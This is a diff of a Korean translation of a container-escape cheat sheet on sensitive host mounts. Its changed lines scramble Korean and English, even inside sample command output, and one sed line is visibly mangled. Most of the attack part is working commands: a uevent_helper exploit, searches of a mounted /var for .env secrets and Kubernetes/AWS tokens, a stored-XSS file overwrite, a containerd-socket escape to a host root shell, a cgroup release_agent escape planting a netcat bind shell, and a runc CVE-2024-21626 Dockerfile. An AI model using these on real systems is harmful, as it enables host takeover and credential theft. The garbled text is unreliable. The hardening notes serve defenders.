@@ -40,11 +40,11 @@ return 0;
 #### **`/proc/sys/kernel/modprobe`**
 
 - [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세히 설명됨.
-- 커널 모듈을 로드하기 위해 호출되는 커널 모듈 로더의 경로를 포함함.
+- 커널 모듈 로더의 경로를 포함하며, 커널 모듈을 로드하기 위해 호출됨.
 - **접근 확인 예제**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # modprobe에 대한 접근 확인
+ls -l $(cat /proc/sys/kernel/modprobe) # modprobe 접근 확인
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
@@ -54,12 +54,12 @@ ls -l $(cat /proc/sys/kernel/modprobe) # modprobe에 대한 접근 확인
 
 #### **`/proc/sys/fs`**
 
-- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 따라 파일 시스템에 대한 옵션과 정보를 포함함.
+- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 따라, 파일 시스템에 대한 옵션과 정보를 포함함.
 - 쓰기 접근은 호스트에 대한 다양한 서비스 거부 공격을 가능하게 할 수 있음.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- 매직 넘버에 따라 비네이티브 이진 형식에 대한 인터프리터를 등록할 수 있음.
+- 매직 넘버에 따라 비네이티브 이진 형식에 대한 해석기를 등록할 수 있음.
 - `/proc/sys/fs/binfmt_misc/register`가 쓰기 가능할 경우 권한 상승 또는 루트 셸 접근으로 이어질 수 있음.
 - 관련된 익스플로잇 및 설명:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
@@ -84,7 +84,7 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 #### **`/proc/kmsg`**
 
 - 커널 링 버퍼 메시지를 노출함.
-- 커널 익스플로잇, 주소 유출 및 민감한 시스템 정보를 제공하는 데 도움이 될 수 있음.
+- 커널 익스플로잇, 주소 누출 및 민감한 시스템 정보를 제공하는 데 도움을 줄 수 있음.
 
 #### **`/proc/kallsyms`**
 
@@ -102,7 +102,7 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 #### **`/proc/kcore`**
 
 - 시스템의 물리적 메모리를 ELF 코어 형식으로 나타냄.
-- 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 유출할 수 있음.
+- 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 누출할 수 있음.
 - 큰 파일 크기는 읽기 문제나 소프트웨어 충돌을 초래할 수 있음.
 - [2019년 /proc/kcore 덤프하기](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)에서 자세한 사용법.
 
@@ -114,7 +114,7 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 #### **`/proc/mem`**
 
 - 물리적 메모리를 나타내는 `/dev/mem`의 대체 인터페이스.
-- 읽기 및 쓰기를 허용하며, 모든 메모리 수정을 위해서는 가상 주소를 물리 주소로 변환해야 함.
+- 읽기 및 쓰기를 허용하며, 모든 메모리 수정을 위해 가상 주소를 물리 주소로 변환해야 함.
 
 #### **`/proc/sched_debug`**
 
@@ -123,7 +123,7 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 
 #### **`/proc/[pid]/mountinfo`**
 
-- 프로세스의 마운트 네임스페이스 내의 마운트 지점에 대한 정보를 제공함.
+- 프로세스의 마운트 네임스페이스 내 마운트 지점에 대한 정보를 제공함.
 - 컨테이너 `rootfs` 또는 이미지의 위치를 노출함.
 
 ### `/sys` 취약점
@@ -132,82 +132,88 @@ echo b > /proc/sysrq-trigger # 호스트 재부팅
 
 - 커널 장치 `uevents`를 처리하는 데 사용됨.
 - `/sys/kernel/uevent_helper`에 쓰면 `uevent` 트리거 시 임의의 스크립트를 실행할 수 있음.
-- **익스플로잇 예제**: %%%bash
+- **익스플로잇 예제**:
+```bash
 
-#### 페이로드 생성
+#### Creates a payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### 컨테이너를 위한 OverlayFS 마운트에서 호스트 경로 찾기
+#### Finds host path from OverlayFS mount for container
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### 악성 헬퍼로 uevent_helper 설정
+#### Sets uevent_helper to malicious helper
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
-#### uevent 트리거
+#### Triggers a uevent
 
 echo change > /sys/class/mem/null/uevent
 
-#### 출력 읽기
+#### Reads the output
 
-cat /output %%%
+cat /output
+```
 
 #### **`/sys/class/thermal`**
 
-- 온도 설정을 제어하며, 서비스 거부 공격이나 물리적 손상을 초래할 수 있음.
+- Controls temperature settings, potentially causing DoS attacks or physical damage.
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- 커널 주소를 유출하여 KASLR을 손상시킬 수 있음.
+- Leaks kernel addresses, potentially compromising KASLR.
 
 #### **`/sys/kernel/security`**
 
-- Linux 보안 모듈(AppArmor 등)의 구성을 허용하는 `securityfs` 인터페이스를 포함함.
-- 접근이 가능하면 컨테이너가 자신의 MAC 시스템을 비활성화할 수 있음.
+- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
+- Access might enable a container to disable its MAC system.
 
-#### **`/sys/firmware/efi/vars` 및 `/sys/firmware/efi/efivars`**
+#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**
 
-- NVRAM에서 EFI 변수와 상호작용하기 위한 인터페이스를 노출함.
-- 잘못된 구성이나 악용은 브릭된 노트북이나 부팅할 수 없는 호스트 머신으로 이어질 수 있음.
+- Exposes interfaces for interacting with EFI variables in NVRAM.
+- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs`는 커널에 대한 "규칙 없음" 디버깅 인터페이스를 제공함.
-- 제한 없는 특성으로 인해 보안 문제의 이력이 있음.
+- `debugfs` offers a "no rules" debugging interface to the kernel.
+- History of security issues due to its unrestricted nature.
 
-### `/var` 취약점
+### `/var` Vulnerabilities
 
-호스트의 **/var** 폴더는 컨테이너 런타임 소켓과 컨테이너의 파일 시스템을 포함함.
-이 폴더가 컨테이너 내부에 마운트되면 해당 컨테이너는 다른 컨테이너의 파일 시스템에 루트 권한으로 읽기-쓰기 접근을 얻게 됨.
-이는 컨테이너 간의 피벗, 서비스 거부를 유발하거나 다른 컨테이너 및 그 안에서 실행되는 애플리케이션에 백도어를 설치하는 데 악용될 수 있음.
+The host's **/var** folder contains container runtime sockets and the containers' filesystems.
+If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
+with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
+containers and applications that run in them.
 
 #### Kubernetes
 
-이와 같은 컨테이너가 Kubernetes로 배포되면:
+If a container like this is deployed with Kubernetes:
+
 ```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-name: pod-mounts-var
-labels:
-app: pentest
-spec:
-containers:
-- name: pod-mounts-var-folder
-image: alpine
-volumeMounts:
-- mountPath: /host-var
-name: noderoot
-command: [ "/bin/sh", "-c", "--" ]
-args: [ "while true; do sleep 30; done;" ]
-volumes:
-- name: noderoot
-hostPath:
-path: /var
+apiVersion: v1  
+kind: Pod  
+metadata:  
+  name: pod-mounts-var  
+  labels:  
+    app: pentest  
+spec:  
+  containers:  
+    - name: pod-mounts-var-folder  
+      image: alpine  
+      volumeMounts:  
+        - mountPath: /host-var  
+          name: noderoot  
+      command: [ "/bin/sh", "-c", "--" ]  
+      args: [ "while true; do sleep 30; done;" ]  
+  volumes:  
+    - name: noderoot  
+      hostPath:  
+        path: /var
 ```
-**pod-mounts-var-folder** 컨테이너 내부:
+
+Inside the **pod-mounts-var-folder** container:
+
 ```bash
 / # find /host-var/ -type f -iname '*.env*' 2>/dev/null
 
@@ -228,17 +234,20 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 / # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
 are/nginx/html/index2.html
 ```
-XSS는 다음과 같이 달성되었습니다:
+
+The XSS was achieved:
 
 ![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
 
-컨테이너는 재시작이나 다른 작업이 필요하지 않다는 점에 유의하세요. 마운트된 **/var** 폴더를 통해 이루어진 모든 변경 사항은 즉시 적용됩니다.
+Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.
 
-구성 파일, 바이너리, 서비스, 애플리케이션 파일 및 셸 프로필을 교체하여 자동(또는 반자동) RCE를 달성할 수도 있습니다.
+You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.
 
-##### 클라우드 자격 증명에 대한 접근
+##### Access to cloud credentials
 
-컨테이너는 K8s 서비스 계정 토큰 또는 AWS 웹 아이덴티티 토큰을 읽을 수 있으며, 이를 통해 컨테이너는 K8s 또는 클라우드에 대한 무단 접근을 얻을 수 있습니다.
+The container can read K8s serviceaccount tokens or AWS webidentity tokens
+which allows the container to gain unauthorized access to K8s or cloud:
+
 ```bash
 / # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
@@ -247,32 +256,100 @@ XSS는 다음과 같이 달성되었습니다:
 /host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
 /host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
+
 #### Docker
 
-Docker(또는 Docker Compose 배포)에서의 악용은 정확히 동일하지만, 일반적으로 다른 컨테이너의 파일 시스템은 다른 기본 경로 아래에서 사용할 수 있습니다:
+The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
+the other containers' filesystems are available under a different base path:
+
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
-Storage Driver: overlay2
-Docker Root Dir: /var/lib/docker
+스토리지 드라이버: overlay2
+도커 루트 디렉토리: /var/lib/docker
 ```
-파일 시스템은 `/var/lib/docker/overlay2/` 아래에 있습니다:
+
+So the filesystems are under `/var/lib/docker/overlay2/`:
+
 ```bash
 $ sudo ls -la /var/lib/docker/overlay2
 
-drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
-drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
-drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
-drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
+drwx--x---  4 root root  4096 1월  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
+drwx--x---  4 root root  4096 1월 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
+drwx--x---  4 root root  4096 1월  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
+drwx--x---  4 root root  4096 1월  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
 <SNIP>
 ```
-#### 주의
 
-실제 경로는 서로 다른 설정에서 다를 수 있으므로, 다른 컨테이너의 파일 시스템과 SA / 웹 아이덴티티 토큰을 찾기 위해 **find** 명령어를 사용하는 것이 가장 좋습니다.
+#### Note
+
+The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
+locate the other containers' filesystems and SA / web identity tokens
 
 
 
-### 참고 문헌
+### Other Sensitive Host Sockets and Directories (2023-2025)
 
+Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:
+
+```text
+/run/containerd/containerd.sock     # containerd CRI 소켓  
+/var/run/crio/crio.sock             # CRI-O 런타임 소켓  
+/run/podman/podman.sock             # Podman API (rootful 또는 rootless)  
+/var/run/kubelet.sock               # Kubernetes 노드의 Kubelet API  
+/run/firecracker-containerd.sock    # Kata / Firecracker
+```
+
+Attack example abusing a mounted **containerd** socket:
+
+```bash
+# 컨테이너 내부 (소켓이 /host/run/containerd.sock에 마운트됨)
+ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
+ctr --address /host/run/containerd.sock run --tty --privileged --mount \
+type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
+chroot /host /bin/bash   # 호스트에서 전체 루트 셸
+```
+
+A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.
+
+Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
+
+```bash
+# assuming the container has CAP_SYS_ADMIN and a vulnerable kernel
+mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
+
+echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
+
+echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
+sh -c "echo 0 > /tmp/x/cgroup.procs"  # triggers the empty-cgroup event
+```
+
+When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.
+
+### Mount-Related Escape CVEs (2023-2025)
+
+* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
+runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).
+
+```Dockerfile
+FROM scratch
+WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
+CMD ["/bin/sh"]
+```
+
+* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
+A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.
+
+### Hardening Reminders (2025)
+
+1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
+2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
+3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
+4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.
+
+### References
+
+- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
+- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
 - [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
 - [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
 - [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)
